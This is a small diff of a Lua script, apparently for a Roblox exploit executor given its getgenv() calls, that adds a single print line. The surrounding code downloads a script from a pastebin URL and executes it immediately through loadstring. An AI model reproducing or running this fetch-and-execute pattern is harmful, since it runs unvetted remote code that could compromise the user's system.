@@ -15,6 +15,7 @@ getgenv().checkfun = function(func)
 end
 
 checkfun(mainmiansimga)
+print("loading loadstring")
 loadstring(httpget("https://pastebin.com/raw/dLg7KgmM"))()
 
 getgenv().consoleclear = function() end
